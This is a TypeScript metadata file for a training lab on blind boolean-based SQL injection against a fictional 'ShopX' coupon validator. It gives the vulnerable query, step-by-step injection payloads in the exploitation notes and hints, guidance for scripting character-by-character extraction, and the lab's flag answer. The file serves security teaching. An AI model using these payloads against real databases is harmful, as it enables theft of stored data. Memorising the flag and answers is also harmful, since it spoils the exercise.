import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab3Metadata: LabMetadata = {
  // ─── Identity ──────────────────────────────────────────────────────
  slug: 'sqli-blind-boolean',
  title: 'SQL Injection: Blind Boolean-Based Extraction',
  ar_title: 'حقن SQL: الاستخراج الأعمى (Boolean-Based)',
  description:
    "ShopX's promo code endpoint returns only 'valid' or 'invalid' — but it is vulnerable to Blind SQL Injection. Extract a hidden admin secret one character at a time.",
  ar_description:
    "نقطة التحقق من الكوبون في ShopX ترجع فقط 'صالح' أو 'غير صالح' — لكنها عرضة لـ Blind SQLi. استخرج السر المخفي حرفًا بحرف.",
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'SQL Injection',
    'Blind SQLi',
    'Boolean Inference',
    'Character-by-Character Extraction',
    'Automated Exploitation',
  ],
  xpReward: 350,
  pointsReward: 175,
  duration: 60,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── Pedagogy ──────────────────────────────────────────────────────
  goal: 'Extract the full admin secret stored in the database by exploiting Boolean-based Blind SQL Injection in the promo code validator.',
  scenario: {
    context:
      "ShopX's checkout page validates promo codes against a database. The response is always binary: " +
      "'✅ Coupon applied!' or '❌ Invalid coupon.' — no data, no errors, just a boolean. " +
      "An admin note containing a secret flag was stored as a private content entry with title='admin_secret'. " +
      'Your mission: craft boolean conditions inside the coupon field to extract this flag character by character.',
    vulnerableCode:
      'SELECT id FROM "LabGenericContent"\n' +
      "WHERE userId='...' AND labId='..'\n" +
      "AND title='valid_coupon' AND body='COUPON_INPUT'",
    exploitation:
      "1) Confirm injection: ' OR '1'='1'-- → should return 'Coupon applied!'\n" +
      "2) Extract char at position 1: ' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1)='F'--\n" +
      '3) Iterate position + charset until full flag is assembled.\n' +
      '4) Submit the extracted flag via POST /practice-labs/:labId/submit',
  },
  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        "First confirm the injection point works: enter ' OR '1'='1'-- as the coupon. If you see 'Coupon applied!' — the field is injectable.",
    },
    {
      order: 2,
      xpCost: 20,
      content:
        "A secret note exists with title='admin_secret'. Use it in a subquery: ' OR (SELECT COUNT(*) FROM \"LabGenericContent\" WHERE title='admin_secret') > 0 --",
    },
    {
      order: 3,
      xpCost: 40,
      content:
        "Extract one character at a time: ' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1) = 'F'--\n" +
        'True response = that character is correct.',
    },
    {
      order: 4,
      xpCost: 60,
      content:
        'Write a script that loops position 1 to 35, and for each position tries chars: A-Z, 0-9, {, }, _. ' +
        'Assemble matched chars into the full flag and submit it via the normal submit endpoint.',
    },
  ],

  // ─── Seed ──────────────────────────────────────────────────────────
  flagAnswer: 'FLAG{BLIND_SQLI_EXFIL_SUCCESS}',
  initialState: {
    contents: [
      // Valid coupons — these are what the UI is "supposed" to check
      {
        title: 'valid_coupon',
        body: 'SAVE20SUMMER',
        isPublic: true,
        author: 'marketing',
      },
      {
        title: 'valid_coupon',
        body: 'FLASH50OFF',
        isPublic: true,
        author: 'marketing',
      },
      {
        title: 'valid_coupon',
        body: 'WELCOME10',
        isPublic: true,
        author: 'marketing',
      },
      // Hidden admin note — never shown in normal app flow
      {
        title: 'admin_secret',
        body: 'FLAG{BLIND_SQLI_EXFIL_SUCCESS}',
        isPublic: false,
        author: 'admin',
      },
    ],
  },
};
